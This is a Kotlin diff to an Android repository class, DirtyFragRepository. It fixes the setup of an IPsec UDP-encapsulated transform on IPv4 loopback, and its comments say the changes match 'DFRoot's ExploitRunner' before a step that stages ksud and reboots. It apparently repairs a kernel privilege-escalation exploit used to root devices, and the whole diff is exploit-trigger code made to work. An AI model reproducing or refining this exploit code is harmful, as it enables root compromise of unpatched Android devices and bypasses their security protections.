@@ -91,7 +91,13 @@ class DirtyFragRepository(private val context: Context) {
         // make the native bind() fail with EADDRINUSE.
         val senderPort = DatagramSocket().use { it.localPort }
 
-        val spi = ipsec.allocateSecurityParameterIndex(InetAddress.getLoopbackAddress())
+        // DFRoot uses the IPv4 loopback explicitly: openUdpEncapsulationSocket()
+        // is IPv4, and the destination address family must match it. InetAddress
+        // .getLoopbackAddress() returns ::1 (IPv6), which makes
+        // buildTransportModeTransform throw "UDP encapsulation socket and
+        // destination address families must match".
+        val loopback = InetAddress.getByName("127.0.0.1")
+        val spi = ipsec.allocateSecurityParameterIndex(loopback)
 
         val aesKey = ByteArray(32)
         val hmacKey = ByteArray(32)
@@ -99,22 +105,14 @@ class DirtyFragRepository(private val context: Context) {
         random.nextBytes(aesKey)
         random.nextBytes(hmacKey)
 
+        // setIpv4Encapsulation applies the NAT-T transform to the encapsulation
+        // socket in both directions, so no separate applyTransportModeTransform
+        // call is needed (matches DFRoot's ExploitRunner).
         val transform = IpSecTransform.Builder(context)
             .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey))
             .setAuthentication(IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128))
             .setIpv4Encapsulation(encapSock, senderPort)
-            .buildTransportModeTransform(InetAddress.getLoopbackAddress(), spi)
-
-        ipsec.applyTransportModeTransform(
-            encapSock.fileDescriptor,
-            IpSecManager.DIRECTION_IN,
-            transform,
-        )
-        ipsec.applyTransportModeTransform(
-            encapSock.fileDescriptor,
-            IpSecManager.DIRECTION_OUT,
-            transform,
-        )
+            .buildTransportModeTransform(loopback, spi)
 
         try {
             stageKsud(reporter)
@@ -130,10 +128,9 @@ class DirtyFragRepository(private val context: Context) {
                 softReboot = false,
             )
         } finally {
-            runCatching { ipsec.removeTransportModeTransforms(encapSock.fileDescriptor) }
             runCatching { transform.close() }
-            runCatching { encapSock.close() }
             runCatching { spi.close() }
+            runCatching { encapSock.close() }
         }
     }
 
